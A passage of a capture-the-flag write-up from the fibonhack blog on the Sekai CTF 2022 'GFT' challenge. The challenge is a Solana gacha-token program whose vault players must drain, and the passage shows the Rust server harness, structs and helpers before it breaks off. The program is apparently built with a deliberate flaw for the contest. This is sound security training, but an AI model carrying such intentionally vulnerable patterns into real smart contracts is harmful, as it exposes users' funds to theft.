</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#555E6E;">#</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFCFC;"> </span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#0F054A;">&amp;</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#FCF5F1;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#979CA6;">*</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FCEDE0;"> </span><span style="color:#F8A251;">*</span><span style="color:#F98C29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#FCC294;">,</span><span style="color:#FCFBFB;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#E9EAEC;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+</span>
+
+       	<h1 class="md:text-6xl text-4xl text-white font-bold ">fibonhack</h1>
+
+    </nav>
+
+    <nav class="md:py-6">
+        <div class="mx-auto max-w-7xl px-2 sm:px-6 lg:px-8">
+          <div class="hidden sm:block relative flex h-16 items-center justify-between">
+            <div class="flex flex-1 items-center justify-center sm:items-stretch sm:justify-center">
+              <div class="sm:ml-6">
+                <div class="flex space-x-4">
+                  
+                  <!-- TODO check current page -->
+                  
+                  <a href="/" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Home</a>
+                  <a href="/resources" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Resources</a>
+                  <a href="/posts" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Posts</a>
+                  <a href="/writeups" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl   text-zinc-300 font-medium " >Writeups</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        <div class="sm:hidden" id="mobile-menu">
+          <div class="space-y-1 px-2 pt-2 pb-3">
+            <a href="/" 
+               
+              class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
+            >
+              Home
+            </a>
+            <a 
+              href="/resources" 
+               
+              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
+            >
+              Resources
+            </a>
+            <a href="/posts" 
+                
+              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
+            >
+              Posts
+            </a>
+            <a href="/writeups" 
+               
+              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
+            >
+              Writeups
+            </a>
+          </div>
+        </div>
+    </nav>
+    <nav class="flex flex-wrap mx-auto w-full max-w-2xl md:px-0 px-4 text-white text-lg">
+        <span class="text-green-500">fibonhack@templeos</span>
+        <p>:</p>
+        <span class="text-blue-400">~/GFT</span>
+        <p>$</p>
+        <div class="ml-1 ">
+            cat main.txt
+        </div>
+    </nav>
+    
+</div>
+  
+  	  
+			<div class="
+				 
+				prose lg:prose-lg prose-invert 
+				container mb-auto px-4 mx-auto py-6
+				text-zinc-300
+				w-full
+				"
+			>
+				<div class="post">
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header" style="padding-bottom: 0.8em;">
+    <p> 2 Oct 2022 </p>
+    <h1 style="margin: -0.02em auto;"> GFT - Sekai CTF 2022 - cryptobro</h1>
+    <div id="authors"> by
+    
+    
+      
+      <a href="/members/f1x3r">f1x3r</a>
+      
+    
+    
+    </div>
+  </header>
+
+  <article class="post-content">
+  <h2 id="the-problem">The problem</h2>
+
+<p>In this challenge we get the source code of the program and the server and a Dockerfile to run the server locally.</p>
+
+<p>The description of the challenge:</p>
+
+<blockquote>
+  <p>Oh no! My blockchain gacha fungible tokens program has been impacted by some hacker! Can you steal my money back for me?</p>
+</blockquote>
+
+<h2 id="understanding-the-problem">Understanding the problem</h2>
+
+<h3 id="server">Server</h3>
+
+<p>The server listens on port 5000 for incoming connections, when a new connection is established <code class="language-plaintext highlighter-rouge">handle_connection</code> gets called.</p>
+
+<p><code class="language-plaintext highlighter-rouge">handle_connection</code> loads the challenge problem, create the user, adds the accounts with the respective lamports (2000 for us and 50000 to the vault), takes our solve as input and runs it, if after running our solve program we have more than 40000 lamports the flag gets sent to us.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// base: https://github.com/otter-sec/sol-ctf-framework/tree/main/examples/moar-horse-5</span>
+
+<span class="k">use</span> <span class="nn">poc_framework_osec</span><span class="p">::{</span>
+    <span class="nn">solana_sdk</span><span class="p">::</span><span class="nn">signature</span><span class="p">::{</span><span class="n">Keypair</span><span class="p">,</span> <span class="n">Signer</span><span class="p">},</span>
+    <span class="n">Environment</span><span class="p">,</span> <span class="n">PrintableTransaction</span><span class="p">,</span> <span class="n">setup_logging</span><span class="p">,</span> <span class="n">LogLevel</span><span class="p">,</span>
+
+<span class="p">};</span>
+
+<span class="k">use</span> <span class="nn">sol_ctf_framework</span><span class="p">::</span><span class="n">ChallengeBuilder</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">solana_program</span><span class="p">::</span><span class="n">system_program</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">std</span><span class="p">::{</span>
+    <span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="p">,</span>
+    <span class="n">fs</span><span class="p">,</span>
+    <span class="nn">io</span><span class="p">::</span><span class="n">Write</span><span class="p">,</span>
+    <span class="nn">net</span><span class="p">::{</span><span class="n">TcpListener</span><span class="p">,</span> <span class="n">TcpStream</span><span class="p">},</span>
+<span class="p">};</span>
+
+<span class="k">use</span> <span class="nn">threadpool</span><span class="p">::</span><span class="n">ThreadPool</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">gft</span><span class="p">::</span><span class="n">get_vault</span><span class="p">;</span>
+
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">listener</span> <span class="o">=</span> <span class="nn">TcpListener</span><span class="p">::</span><span class="nf">bind</span><span class="p">(</span><span class="s">"0.0.0.0:5000"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">pool</span> <span class="o">=</span> <span class="nn">ThreadPool</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+    <span class="k">for</span> <span class="n">stream</span> <span class="k">in</span> <span class="n">listener</span><span class="nf">.incoming</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+        <span class="n">pool</span><span class="nf">.execute</span><span class="p">(||</span> <span class="p">{</span>
+            <span class="nf">handle_connection</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">handle_connection</span><span class="p">(</span><span class="k">mut</span> <span class="n">socket</span><span class="p">:</span> <span class="n">TcpStream</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">builder</span> <span class="o">=</span> <span class="nn">ChallengeBuilder</span><span class="p">::</span><span class="nf">try_from</span><span class="p">(</span><span class="n">socket</span><span class="nf">.try_clone</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">())</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="c1">// load programs</span>
+    <span class="k">let</span> <span class="n">solve_pubkey</span> <span class="o">=</span> <span class="n">builder</span><span class="nf">.input_program</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">program_pubkey</span> <span class="o">=</span> <span class="n">builder</span><span class="nf">.chall_programs</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">"./gft.so"</span><span class="p">])[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// make user</span>
+    <span class="k">let</span> <span class="n">user</span> <span class="o">=</span> <span class="nn">Keypair</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+
+    <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"program: {}"</span><span class="p">,</span> <span class="n">program_pubkey</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"user: {}"</span><span class="p">,</span> <span class="n">user</span><span class="nf">.pubkey</span><span class="p">())</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="c1">// add accounts and lamports</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_vault</span><span class="p">(</span><span class="n">program_pubkey</span><span class="p">);</span>
+
+    <span class="c1">// beeg money</span>
+    <span class="k">const</span> <span class="n">TARGET_BAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">40_000</span><span class="p">;</span>
+    <span class="k">const</span> <span class="n">INIT_BAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">2_000</span><span class="p">;</span>
+    <span class="k">const</span> <span class="n">VAULT_BAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">50_000</span><span class="p">;</span>
+
+    <span class="n">builder</span>
+        <span class="py">.builder</span>
+        <span class="nf">.add_account_with_lamports</span><span class="p">(</span><span class="n">user</span><span class="nf">.pubkey</span><span class="p">(),</span> <span class="nn">system_program</span><span class="p">::</span><span class="n">ID</span><span class="p">,</span> <span class="n">INIT_BAL</span><span class="p">);</span>
+    <span class="n">builder</span>
+        <span class="py">.builder</span>
+        <span class="nf">.add_account_with_lamports</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">program_pubkey</span><span class="p">,</span> <span class="n">VAULT_BAL</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">builder</span><span class="nf">.build</span><span class="p">();</span>
+
+    <span class="c1">// run solve</span>
+    <span class="n">challenge</span><span class="nf">.input_instruction</span><span class="p">(</span><span class="n">solve_pubkey</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">user</span><span class="p">])</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="c1">// check solve</span>
+    <span class="k">let</span> <span class="n">balance</span> <span class="o">=</span> <span class="n">challenge</span><span class="py">.env</span><span class="nf">.get_account</span><span class="p">(</span><span class="n">user</span><span class="nf">.pubkey</span><span class="p">())</span><span class="nf">.unwrap</span><span class="p">()</span><span class="py">.lamports</span><span class="p">;</span>
+    <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"lamports: {:?}"</span><span class="p">,</span> <span class="n">balance</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="n">balance</span> <span class="o">&gt;</span> <span class="n">TARGET_BAL</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">flag</span> <span class="o">=</span> <span class="nn">fs</span><span class="p">::</span><span class="nf">read_to_string</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+        <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"your did it!</span><span class="se">\n</span><span class="s">Flag: {}"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="program">Program</h3>
+
+<h4 id="entrypointrs">entrypoint.rs</h4>
+
+<p>When we call the challenge program the function <code class="language-plaintext highlighter-rouge">process_instruction</code> gets called with all the parameters forwarded.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">entrypoint!</span><span class="p">(</span><span class="n">start</span><span class="p">);</span>
+<span class="k">fn</span> <span class="nf">start</span><span class="p">(</span><span class="n">program_id</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span> <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span> <span class="n">instruction_data</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="nb">u8</span><span class="p">])</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">crate</span><span class="p">::</span><span class="nn">processor</span><span class="p">::</span><span class="nf">process_instruction</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span> <span class="n">accounts</span><span class="p">,</span> <span class="n">instruction_data</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="librs">lib.rs</h4>
+
+<p>In here there are some helper functions to create the invocations, other helpers to retrieve some data and the structs used in the challenge that can be serialized and deserialized with the <code class="language-plaintext highlighter-rouge">borsh</code> crate.</p>
+
+<h5 id="structs">structs</h5>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// used to specify the instruction we want to run</span>
+<span class="nd">#[derive(BorshSerialize,</span> <span class="nd">BorshDeserialize)]</span>
+<span class="k">pub</span> <span class="k">enum</span> <span class="n">GachaInstruction</span> <span class="p">{</span>
+    <span class="n">CreateUserAccount</span> <span class="p">{</span>
+        <span class="n">account_name</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+        <span class="n">account_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="n">BuyPrimos</span> <span class="p">{</span>
+        <span class="n">amount</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+        <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="n">BuyCharacter</span> <span class="p">{</span>
+        <span class="n">character_id</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+        <span class="n">character_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+        <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="n">SellAccount</span> <span class="p">{</span>
+        <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="p">},</span>
+<span class="p">}</span>
+
+<span class="c1">// used to store account data</span>
+
+<span class="nd">#[derive(BorshSerialize,</span> <span class="nd">BorshDeserialize)]</span>
+<span class="k">pub</span> <span class="k">struct</span> <span class="n">UserAccount</span> <span class="p">{</span>
+    <span class="k">pub</span> <span class="n">primos</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">characters</span><span class="p">:</span> <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">owner</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="c1">// used to store character data</span>
+<span class="nd">#[derive(BorshSerialize,</span> <span class="nd">BorshDeserialize,</span> <span class="nd">Debug)]</span>
+<span class="k">pub</span> <span class="k">struct</span> <span class="n">Character</span> <span class="p">{</span>
+    <span class="k">pub</span> <span class="n">stars</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">name</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">id</span><span class="p">:</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">owner</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="data-retrieval-helpers">data retrieval helpers</h5>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// retrieve useraccount pubkey and bump</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">get_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="p">(</span><span class="n">Pubkey</span><span class="p">,</span> <span class="nb">u8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">find_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">b"ACCOUNT"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user</span><span class="nf">.to_bytes</span><span class="p">(),</span> <span class="n">name</span><span class="nf">.as_bytes</span><span class="p">()],</span> <span class="o">&amp;</span><span class="n">program</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="c1">// retrieve character pubkey and bump</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">get_character</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">useraccount</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">character_id</span><span class="p">:</span> <span class="nb">u8</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="p">(</span><span class="n">Pubkey</span><span class="p">,</span> <span class="nb">u8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">find_program_address</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="s">b"CHARACTER"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">useraccount</span><span class="nf">.to_bytes</span><span class="p">(),</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">character_id</span><span class="p">]],</span>
+        <span class="o">&amp;</span><span class="n">program</span><span class="p">,</span>
+    <span class="p">)</span>
+<span class="p">}</span>
+
+<span class="c1">// retrieve vault pubkey and bump</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">get_vault</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="p">(</span><span class="n">Pubkey</span><span class="p">,</span> <span class="nb">u8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">find_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">b"VAULT"</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">program</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="invocation-instruction-helpers">invocation instruction helpers</h5>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// create a `CreateUserAccount` instruction with the user pubkey and the `account_name`</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">create_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span> <span class="n">Pubkey</span><span class="p">,</span> <span class="n">account_name</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Instruction</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="n">useraccount_bump</span><span class="p">)</span> <span class="o">=</span> <span class="nf">get_useraccount</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">account_name</span><span class="p">);</span>
+    <span class="n">Instruction</span> <span class="p">{</span>
+        <span class="n">program_id</span><span class="p">:</span> <span class="n">program</span><span class="p">,</span>
+        <span class="n">accounts</span><span class="p">:</span> <span class="nd">vec!</span><span class="p">[</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">useraccount</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+            <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span>
